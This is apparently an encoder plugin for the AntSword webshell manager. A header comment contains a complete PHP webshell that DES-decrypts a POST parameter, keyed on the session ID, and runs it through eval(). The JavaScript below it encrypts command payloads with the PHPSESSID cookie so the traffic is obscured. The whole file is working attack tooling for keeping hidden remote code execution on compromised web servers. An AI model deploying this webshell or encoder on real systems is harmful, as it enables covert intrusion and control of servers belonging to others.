/**
 * php::DES编码器
 * Create at: 2019/08/21 21:09:04
 * 
 * webshell：
<?php
function encrypt($key, $str){
  $block = mcrypt_get_block_size('des', 'ecb');
  $pad = $block - (strlen($str) % $block);
  $str .= str_repeat(chr($pad), $pad);
  $enc_str = mcrypt_encrypt(MCRYPT_DES, $key, $str, MCRYPT_MODE_ECB);
  return base64_encode($enc_str);
}

function decrypt($key,$str){
  $str = base64_decode($str);
  $str = mcrypt_decrypt(MCRYPT_DES, $key, $str, MCRYPT_MODE_ECB);
  $block = mcrypt_get_block_size('des', 'ecb');
  $pad = ord($str[($len = strlen($str)) - 1]);
  return substr($str, 0, strlen($str) - $pad);
}

@session_start();
$pwd='code';
$key=substr(str_pad(session_id(),16,'a'),0,8);
@eval(decrypt($key,$_POST[$pwd]));
?>
 * 
 * 
 * 
 */

'use strict';
const path = require('path');
var CryptoJS = require(path.join(window.antSword.remote.process.env.AS_WORKDIR, 'node_modules/crypto-js'));

function get_cookie(Name, CookieStr="") {
   var search = Name + "="
   var returnvalue = "";
   if (CookieStr.length > 0) {
     var sd = CookieStr.indexOf(search);
     if (sd!= -1) {
        sd += search.length;
        var end = CookieStr.indexOf(";", sd);
        if (end == -1){
          end = CookieStr.length;
        }
        returnvalue = window.unescape(CookieStr.substring(sd, end));
      }
   } 
   return returnvalue;
}


function encryptByDES(key,message) {
  var keyHex = CryptoJS.enc.Utf8.parse(key);      
  var encrypted = CryptoJS.DES.encrypt(message, keyHex, {
      mode: CryptoJS.mode.ECB,
      padding: CryptoJS.pad.Pkcs7
  });
  return encrypted.toString();
}

function decryptByDES(key,ciphertext) {        
  var keyHex = CryptoJS.enc.Utf8.parse(key);      
  var decrypted = CryptoJS.DES.decrypt({
      ciphertext: CryptoJS.enc.Base64.parse(ciphertext)
  }, keyHex, {
      mode: CryptoJS.mode.ECB,
      padding: CryptoJS.pad.Pkcs7
  });

  return decrypted.toString(CryptoJS.enc.Utf8);
}
/*
* @param  {String} pwd   连接密码
* @param  {Array}  data  编码器处理前的 payload 数组
* @return {Array}  data  编码器处理后的 payload 数组
*/
module.exports = (pwd, data, ext={}) => {
  // ##########    请在下方编写你自己的代码   ###################
  let headers = ext.opts.httpConf.headers;
  if(!headers.hasOwnProperty('Cookie')) {
    window.toastr.error("请先设置 Cookie (大小写敏感), 可通过浏览网站获取Cookie", "错误");
    return data;
  }
  let session_key = "PHPSESSID";
  let keyStr = get_cookie(session_key, headers['Cookie']);
  if(keyStr.length === 0) {
    window.toastr.error("未在 Cookie 中发现PHPSESSID", "错误");
    return data;
  }
  data[pwd] = encryptByDES(keyStr.substr(0,8), data['_']);
  // ##########    请在上方编写你自己的代码   ###################
  // 删除 _ 原有的payload
  delete data['_'];
  // 返回编码器处理后的 payload 数组
  return data;
}
